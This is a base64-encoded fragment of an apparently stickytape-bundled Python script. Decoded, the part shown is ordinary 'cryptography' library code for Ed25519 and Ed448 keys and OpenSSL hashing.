lbGYuX2V2cF9wa2V5LFxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG4gICAgICAgIGJ1ZiA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoInVuc2lnbmVkIGNoYXJbXSIsIF9FRDI1NTE5X1NJR19TSVpFKVxyXG4gICAgICAgIGJ1ZmxlbiA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoInNpemVfdCAqIiwgbGVuKGJ1ZikpXHJcbiAgICAgICAgcmVzID0gc2VsZi5fYmFja2VuZC5fbGliLkVWUF9EaWdlc3RTaWduKFxyXG4gICAgICAgICAgICBldnBfbWRfY3R4LCBidWYsIGJ1ZmxlbiwgZGF0YSwgbGVuKGRhdGEpXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChidWZsZW5bMF0gPT0gX0VEMjU1MTlfU0lHX1NJWkUpXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2JhY2tlbmQuX2ZmaS5idWZmZXIoYnVmLCBidWZsZW5bMF0pWzpdXHJcblxyXG4gICAgZGVmIHByaXZhdGVfYnl0ZXMoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBlbmNvZGluZzogc2VyaWFsaXphdGlvbi5FbmNvZGluZyxcclxuICAgICAgICBmb3JtYXQ6IHNlcmlhbGl6YXRpb24uUHJpdmF0ZUZvcm1hdCxcclxuICAgICAgICBlbmNyeXB0aW9uX2FsZ29yaXRobTogc2VyaWFsaXphdGlvbi5LZXlTZXJpYWxpemF0aW9uRW5jcnlwdGlvbixcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgaWYgKFxyXG4gICAgICAgICAgICBlbmNvZGluZyBpcyBzZXJpYWxpemF0aW9uLkVuY29kaW5nLlJhd1xyXG4gICAgICAgICAgICBvciBmb3JtYXQgaXMgc2VyaWFsaXphdGlvbi5QdWJsaWNGb3JtYXQuUmF3XHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgaWYgKFxyXG4gICAgICAgICAgICAgICAgZm9ybWF0IGlzIG5vdCBzZXJpYWxpemF0aW9uLlByaXZhdGVGb3JtYXQuUmF3XHJcbiAgICAgICAgICAgICAgICBvciBlbmNvZGluZyBpcyBub3Qgc2VyaWFsaXphdGlvbi5FbmNvZGluZy5SYXdcclxuICAgICAgICAgICAgICAgIG9yIG5vdCBpc2luc3RhbmNlKFxyXG4gICAgICAgICAgICAgICAgICAgIGVuY3J5cHRpb25fYWxnb3JpdGhtLCBzZXJpYWxpemF0aW9uLk5vRW5jcnlwdGlvblxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICApOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiV2hlbiB1c2luZyBSYXcgYm90aCBlbmNvZGluZyBhbmQgZm9ybWF0IG11c3QgYmUgUmF3ICJcclxuICAgICAgICAgICAgICAgICAgICAiYW5kIGVuY3J5cHRpb25fYWxnb3JpdGhtIG11c3QgYmUgTm9FbmNyeXB0aW9uKCkiXHJcbiAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fcmF3X3ByaXZhdGVfYnl0ZXMoKVxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5fYmFja2VuZC5fcHJpdmF0ZV9rZXlfYnl0ZXMoXHJcbiAgICAgICAgICAgIGVuY29kaW5nLCBmb3JtYXQsIGVuY3J5cHRpb25fYWxnb3JpdGhtLCBzZWxmLCBzZWxmLl9ldnBfcGtleSwgTm9uZVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgX3Jhd19wcml2YXRlX2J5dGVzKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIGJ1ZiA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoInVuc2lnbmVkIGNoYXIgW10iLCBfRUQyNTUxOV9LRVlfU0laRSlcclxuICAgICAgICBidWZsZW4gPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJzaXplX3QgKiIsIF9FRDI1NTE5X0tFWV9TSVpFKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfUEtFWV9nZXRfcmF3X3ByaXZhdGVfa2V5KFxyXG4gICAgICAgICAgICBzZWxmLl9ldnBfcGtleSwgYnVmLCBidWZsZW5cclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KGJ1ZmxlblswXSA9PSBfRUQyNTUxOV9LRVlfU0laRSlcclxuICAgICAgICByZXR1cm4gc2VsZi5fYmFja2VuZC5fZmZpLmJ1ZmZlcihidWYsIF9FRDI1NTE5X0tFWV9TSVpFKVs6XVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9iYWNrZW5kcy9vcGVuc3NsL2VkNDQ4LnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG5cclxuaW1wb3J0IHR5cGluZ1xyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkgaW1wb3J0IGV4Y2VwdGlvbnNcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMgaW1wb3J0IHNlcmlhbGl6YXRpb25cclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuYXN5bW1ldHJpYy5lZDQ0OCBpbXBvcnQgKFxyXG4gICAgRWQ0NDhQcml2YXRlS2V5LFxyXG4gICAgRWQ0NDhQdWJsaWNLZXksXHJcbilcclxuXHJcbmlmIHR5cGluZy5UWVBFX0NIRUNLSU5HOlxyXG4gICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgQmFja2VuZFxyXG5cclxuX0VENDQ4X0tFWV9TSVpFID0gNTdcclxuX0VENDQ4X1NJR19TSVpFID0gMTE0XHJcblxyXG5cclxuY2xhc3MgX0VkNDQ4UHVibGljS2V5KEVkNDQ4UHVibGljS2V5KTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBiYWNrZW5kOiAiQmFja2VuZCIsIGV2cF9wa2V5KTpcclxuICAgICAgICBzZWxmLl9iYWNrZW5kID0gYmFja2VuZFxyXG4gICAgICAgIHNlbGYuX2V2cF9wa2V5ID0gZXZwX3BrZXlcclxuXHJcbiAgICBkZWYgcHVibGljX2J5dGVzKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZW5jb2Rpbmc6IHNlcmlhbGl6YXRpb24uRW5jb2RpbmcsXHJcbiAgICAgICAgZm9ybWF0OiBzZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdCxcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgaWYgKFxyXG4gICAgICAgICAgICBlbmNvZGluZyBpcyBzZXJpYWxpemF0aW9uLkVuY29kaW5nLlJhd1xyXG4gICAgICAgICAgICBvciBmb3JtYXQgaXMgc2VyaWFsaXphdGlvbi5QdWJsaWNGb3JtYXQuUmF3XHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgaWYgKFxyXG4gICAgICAgICAgICAgICAgZW5jb2RpbmcgaXMgbm90IHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuUmF3XHJcbiAgICAgICAgICAgICAgICBvciBmb3JtYXQgaXMgbm90IHNlcmlhbGl6YXRpb24uUHVibGljRm9ybWF0LlJhd1xyXG4gICAgICAgICAgICApOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiV2hlbiB1c2luZyBSYXcgYm90aCBlbmNvZGluZyBhbmQgZm9ybWF0IG11c3QgYmUgUmF3IlxyXG4gICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX3Jhd19wdWJsaWNfYnl0ZXMoKVxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5fYmFja2VuZC5fcHVibGljX2tleV9ieXRlcyhcclxuICAgICAgICAgICAgZW5jb2RpbmcsIGZvcm1hdCwgc2VsZiwgc2VsZi5fZXZwX3BrZXksIE5vbmVcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9yYXdfcHVibGljX2J5dGVzKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIGJ1ZiA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoInVuc2lnbmVkIGNoYXIgW10iLCBfRUQ0NDhfS0VZX1NJWkUpXHJcbiAgICAgICAgYnVmbGVuID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygic2l6ZV90ICoiLCBfRUQ0NDhfS0VZX1NJWkUpXHJcbiAgICAgICAgcmVzID0gc2VsZi5fYmFja2VuZC5fbGliLkVWUF9QS0VZX2dldF9yYXdfcHVibGljX2tleShcclxuICAgICAgICAgICAgc2VsZi5fZXZwX3BrZXksIGJ1ZiwgYnVmbGVuXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChidWZsZW5bMF0gPT0gX0VENDQ4X0tFWV9TSVpFKVxyXG4gICAgICAgIHJldHVybiBzZWxmLl9iYWNrZW5kLl9mZmkuYnVmZmVyKGJ1ZiwgX0VENDQ4X0tFWV9TSVpFKVs6XVxyXG5cclxuICAgIGRlZiB2ZXJpZnkoc2VsZiwgc2lnbmF0dXJlOiBieXRlcywgZGF0YTogYnl0ZXMpIC0+IE5vbmU6XHJcbiAgICAgICAgZXZwX21kX2N0eCA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfTURfQ1RYX25ldygpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChldnBfbWRfY3R4ICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGV2cF9tZF9jdHggPSBzZWxmLl9iYWNrZW5kLl9mZmkuZ2MoXHJcbiAgICAgICAgICAgIGV2cF9tZF9jdHgsIHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfTURfQ1RYX2ZyZWVcclxuICAgICAgICApXHJcbiAgICAgICAgcmVzID0gc2VsZi5fYmFja2VuZC5fbGliLkVWUF9EaWdlc3RWZXJpZnlJbml0KFxyXG4gICAgICAgICAgICBldnBfbWRfY3R4LFxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTCxcclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMLFxyXG4gICAgICAgICAgICBzZWxmLl9ldnBfcGtleSxcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgICAgICByZXMgPSBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX0RpZ2VzdFZlcmlmeShcclxuICAgICAgICAgICAgZXZwX21kX2N0eCwgc2lnbmF0dXJlLCBsZW4oc2lnbmF0dXJlKSwgZGF0YSwgbGVuKGRhdGEpXHJcbiAgICAgICAgKVxyXG4gICAgICAgIGlmIHJlcyAhPSAxOlxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLl9jb25zdW1lX2Vycm9ycygpXHJcbiAgICAgICAgICAgIHJhaXNlIGV4Y2VwdGlvbnMuSW52YWxpZFNpZ25hdHVyZVxyXG5cclxuXHJcbmNsYXNzIF9FZDQ0OFByaXZhdGVLZXkoRWQ0NDhQcml2YXRlS2V5KTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBiYWNrZW5kOiAiQmFja2VuZCIsIGV2cF9wa2V5KTpcclxuICAgICAgICBzZWxmLl9iYWNrZW5kID0gYmFja2VuZFxyXG4gICAgICAgIHNlbGYuX2V2cF9wa2V5ID0gZXZwX3BrZXlcclxuXHJcbiAgICBkZWYgcHVibGljX2tleShzZWxmKSAtPiBFZDQ0OFB1YmxpY0tleTpcclxuICAgICAgICBidWYgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJ1bnNpZ25lZCBjaGFyIFtdIiwgX0VENDQ4X0tFWV9TSVpFKVxyXG4gICAgICAgIGJ1ZmxlbiA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoInNpemVfdCAqIiwgX0VENDQ4X0tFWV9TSVpFKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfUEtFWV9nZXRfcmF3X3B1YmxpY19rZXkoXHJcbiAgICAgICAgICAgIHNlbGYuX2V2cF9wa2V5LCBidWYsIGJ1ZmxlblxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoYnVmbGVuWzBdID09IF9FRDQ0OF9LRVlfU0laRSlcclxuICAgICAgICBwdWJsaWNfYnl0ZXMgPSBzZWxmLl9iYWNrZW5kLl9mZmkuYnVmZmVyKGJ1ZilbOl1cclxuICAgICAgICByZXR1cm4gc2VsZi5fYmFja2VuZC5lZDQ0OF9sb2FkX3B1YmxpY19ieXRlcyhwdWJsaWNfYnl0ZXMpXHJcblxyXG4gICAgZGVmIHNpZ24oc2VsZiwgZGF0YTogYnl0ZXMpIC0+IGJ5dGVzOlxyXG4gICAgICAgIGV2cF9tZF9jdHggPSBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX01EX0NUWF9uZXcoKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoZXZwX21kX2N0eCAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICBldnBfbWRfY3R4ID0gc2VsZi5fYmFja2VuZC5fZmZpLmdjKFxyXG4gICAgICAgICAgICBldnBfbWRfY3R4LCBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX01EX0NUWF9mcmVlXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfRGlnZXN0U2lnbkluaXQoXHJcbiAgICAgICAgICAgIGV2cF9tZF9jdHgsXHJcbiAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMLFxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTCxcclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgICAgIHNlbGYuX2V2cF9wa2V5LFxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG4gICAgICAgIGJ1ZiA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoInVuc2lnbmVkIGNoYXJbXSIsIF9FRDQ0OF9TSUdfU0laRSlcclxuICAgICAgICBidWZsZW4gPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJzaXplX3QgKiIsIGxlbihidWYpKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfRGlnZXN0U2lnbihcclxuICAgICAgICAgICAgZXZwX21kX2N0eCwgYnVmLCBidWZsZW4sIGRhdGEsIGxlbihkYXRhKVxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoYnVmbGVuWzBdID09IF9FRDQ0OF9TSUdfU0laRSlcclxuICAgICAgICByZXR1cm4gc2VsZi5fYmFja2VuZC5fZmZpLmJ1ZmZlcihidWYsIGJ1ZmxlblswXSlbOl1cclxuXHJcbiAgICBkZWYgcHJpdmF0ZV9ieXRlcyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGVuY29kaW5nOiBzZXJpYWxpemF0aW9uLkVuY29kaW5nLFxyXG4gICAgICAgIGZvcm1hdDogc2VyaWFsaXphdGlvbi5Qcml2YXRlRm9ybWF0LFxyXG4gICAgICAgIGVuY3J5cHRpb25fYWxnb3JpdGhtOiBzZXJpYWxpemF0aW9uLktleVNlcmlhbGl6YXRpb25FbmNyeXB0aW9uLFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgIGVuY29kaW5nIGlzIHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuUmF3XHJcbiAgICAgICAgICAgIG9yIGZvcm1hdCBpcyBzZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdC5SYXdcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgICAgICBmb3JtYXQgaXMgbm90IHNlcmlhbGl6YXRpb24uUHJpdmF0ZUZvcm1hdC5SYXdcclxuICAgICAgICAgICAgICAgIG9yIGVuY29kaW5nIGlzIG5vdCBzZXJpYWxpemF0aW9uLkVuY29kaW5nLlJhd1xyXG4gICAgICAgICAgICAgICAgb3Igbm90IGlzaW5zdGFuY2UoXHJcbiAgICAgICAgICAgICAgICAgICAgZW5jcnlwdGlvbl9hbGdvcml0aG0sIHNlcmlhbGl6YXRpb24uTm9FbmNyeXB0aW9uXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICk6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICJXaGVuIHVzaW5nIFJhdyBib3RoIGVuY29kaW5nIGFuZCBmb3JtYXQgbXVzdCBiZSBSYXcgIlxyXG4gICAgICAgICAgICAgICAgICAgICJhbmQgZW5jcnlwdGlvbl9hbGdvcml0aG0gbXVzdCBiZSBOb0VuY3J5cHRpb24oKSJcclxuICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9yYXdfcHJpdmF0ZV9ieXRlcygpXHJcblxyXG4gICAgICAgIHJldHVybiBzZWxmLl9iYWNrZW5kLl9wcml2YXRlX2tleV9ieXRlcyhcclxuICAgICAgICAgICAgZW5jb2RpbmcsIGZvcm1hdCwgZW5jcnlwdGlvbl9hbGdvcml0aG0sIHNlbGYsIHNlbGYuX2V2cF9wa2V5LCBOb25lXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfcmF3X3ByaXZhdGVfYnl0ZXMoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgYnVmID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygidW5zaWduZWQgY2hhciBbXSIsIF9FRDQ0OF9LRVlfU0laRSlcclxuICAgICAgICBidWZsZW4gPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJzaXplX3QgKiIsIF9FRDQ0OF9LRVlfU0laRSlcclxuICAgICAgICByZXMgPSBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX1BLRVlfZ2V0X3Jhd19wcml2YXRlX2tleShcclxuICAgICAgICAgICAgc2VsZi5fZXZwX3BrZXksIGJ1ZiwgYnVmbGVuXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChidWZsZW5bMF0gPT0gX0VENDQ4X0tFWV9TSVpFKVxyXG4gICAgICAgIHJldHVybiBzZWxmLl9iYWNrZW5kLl9mZmkuYnVmZmVyKGJ1ZiwgX0VENDQ4X0tFWV9TSVpFKVs6XVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9iYWNrZW5kcy9vcGVuc3NsL2hhc2hlcy5weScsIGInIyBUaGlzIGZpbGUgaXMgZHVhbCBsaWNlbnNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uXHJcbiMgMi4wLCBhbmQgdGhlIEJTRCBMaWNlbnNlLiBTZWUgdGhlIExJQ0VOU0UgZmlsZSBpbiB0aGUgcm9vdCBvZiB0aGlzIHJlcG9zaXRvcnlcclxuIyBmb3IgY29tcGxldGUgZGV0YWlscy5cclxuXHJcbmltcG9ydCB0eXBpbmdcclxuXHJcbmZyb20gY3J5cHRvZ3JhcGh5LmV4Y2VwdGlvbnMgaW1wb3J0IFVuc3VwcG9ydGVkQWxnb3JpdGhtLCBfUmVhc29uc1xyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgaGFzaGVzXHJcblxyXG5cclxuaWYgdHlwaW5nLlRZUEVfQ0hFQ0tJTkc6XHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBCYWNrZW5kXHJcblxyXG5cclxuY2xhc3MgX0hhc2hDb250ZXh0KGhhc2hlcy5IYXNoQ29udGV4dCk6XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZiwgYmFja2VuZDogIkJhY2tlbmQiLCBhbGdvcml0aG06IGhhc2hlcy5IYXNoQWxnb3JpdGhtLCBjdHg9Tm9uZVxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX2FsZ29yaXRobSA9IGFsZ29yaXRobVxyXG5cclxuICAgICAgICBzZWxmLl9iYWNrZW5kID0gYmFja2VuZFxyXG5cclxuICAgICAgICBpZiBjdHggaXMgTm9uZTpcclxuICAgICAgICAgICAgY3R4ID0gc2VsZi5fYmFja2VuZC5fbGliLkVWUF9NRF9DVFhfbmV3KClcclxuICAgICAgICAgICAgY3R4ID0gc2VsZi5fYmFja2VuZC5fZmZpLmdjKFxyXG4gICAgICAgICAgICAgICAgY3R4LCBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX01EX0NUWF9mcmVlXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICAgICAgZXZwX21kID0gc2VsZi5fYmFja2VuZC5fZXZwX21kX2Zyb21fYWxnb3JpdGhtKGFsZ29yaXRobSlcclxuICAgICAgICAgICAgaWYgZXZwX21kID09IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVW5zdXBwb3J0ZWRBbGdvcml0aG0oXHJcbiAgICAgICAgICAgICAgICAgICAgInt9IGlzIG5vdCBhIHN1cHBvcnRlZCBoYXNoIG9uIHRoaXMgYmFja2VuZC4iLmZvcm1hdChcclxuICAgICAgICAgICAgICAgICAgICAgICAgYWxnb3JpdGhtLm5hbWVcclxuICAgICAgICAgICAgICAgICAgICApLFxyXG4gICAgICAgICAgICAgICAgICAgIF9SZWFzb25zLlVOU1VQUE9SVEVEX0hBU0gsXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfRGlnZXN0SW5pdF9leChcclxuICAgICAgICAgICAgICAgIGN0eCwgZXZwX21kLCBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzICE9IDApXHJcblxyXG4gICAgICAgIHNlbGYuX2N0eCA9IGN0eFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGFsZ29yaXRobShzZWxmKSAtPiBoYXNoZXMuSGFzaEFsZ29yaXRobTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fYWxnb3JpdGhtXHJcblxyXG4gICAgZGVmIGNvcHkoc2VsZikgLT4gIl9IYXNoQ29udGV4dCI6XHJcbiAgICAgICAgY29waWVkX2N0eCA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfTURfQ1RYX25ldygpXHJcbiAgICAgICAgY29waWVkX2N0eCA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5nYyhcclxuICAgICAgICAgICAgY29waWVkX2N0eCwgc2VsZi5fYmFja2VuZC5fbGliLkVWUF9NRF9DVFhfZnJlZVxyXG4gICAgICAgIClcclxuICAgICAgICByZXMgPSBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX01EX0NUWF9jb3B5X2V4KGNvcGllZF9jdHgsIHNlbGYuX2N0eClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyAhPSAwKVxyXG4gICAgICAgIHJldHVybiBfSGFzaENvbnRleHQoc2VsZi5fYmFja2VuZCwgc2VsZi5hbGdvcml0aG0sIGN0eD1jb3BpZWRfY3R4KVxyXG5cclxuICAgIGRlZiB1cGRhdGUoc2VsZiwgZGF0YTogYnl0ZXMpIC0+IE5vbmU6XHJcbiAgICAgICAgZGF0YV9wdHIgPSBzZWxmLl9iYWNrZW5kLl9mZmkuZnJvbV9idWZmZXIoZGF0YSlcclxuICAgICAgICByZXMgPSBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX0RpZ2VzdFVwZGF0ZShcclxuICAgICAgICAgICAgc2VsZi5fY3R4LCBkYXRhX3B0ciwgbGVuKGRhdGEpXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzICE9IDApXHJcblxyXG4gICAgZGVmIGZpbmFsaXplKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIGlmIGlzaW5zdGFuY2Uoc2VsZi5hbGdvcml0aG0sIGhhc2hlcy5FeHRlbmRhYmxlT3V0cHV0RnVuY3Rpb24pOlxyXG4gICAgICAgICAgICAjIGV4dGVuZGFibGUgb3V0cHV0IGZ1bmN0aW9ucyB1c2UgYSBkaWZmZXJlbnQgZmluYWxpemVcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX2ZpbmFsaXplX3hvZigpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgYnVmID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldyhcclxuICAgICAgICAgICAgICAgICJ1bnNpZ25lZCBjaGFyW10iLCBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX01BWF9NRF9TSVpFXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICAgICAgb3V0bGVuID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygidW5zaWduZWQgaW50ICoiKVxyXG4gICAgICAgICAgICByZXMgPSBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX0RpZ2VzdEZpbmFsX2V4KHNlbGYuX2N0eCwgYnVmLCBvdXRsZW4pXHJcbiAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzICE9IDApXHJcbiAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoXHJcbiAgICAgICAgICAgICAgICBvdXRsZW5bMF0gPT0gc2VsZi5hbGdvcml0aG0uZGlnZXN0X3NpemVcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fYmFja2VuZC5fZmZpLmJ1ZmZlcihidWYpWzogb3V0bGVuWzBdXVxyXG5cclxuICAgIGRlZiBfZmluYWxpemVfeG9mKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIGJ1ZiA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoXHJcbiAgICAgICAgICAgICJ1bnNpZ25lZCBjaGFyW10iLCBzZWxmLmFsZ29yaXRobS5kaWdlc3Rfc2l6ZVxyXG4gICAgICAgIClcclxuICAgICAgICByZXMgPSBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX0RpZ2VzdEZpbmFsWE9GKFxyXG4gICAgICAgICAgICBzZWxmLl9jdHgsIGJ1Ziwgc2VsZi5hbGdvcml0aG0uZGlnZXN0X3NpemVcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgIT0gMClcclxuICAgICAgICByZXR1cm4gc2VsZi5fYmFja2VuZC5fZmZpLmJ1ZmZlcihidWYpWzogc2VsZi5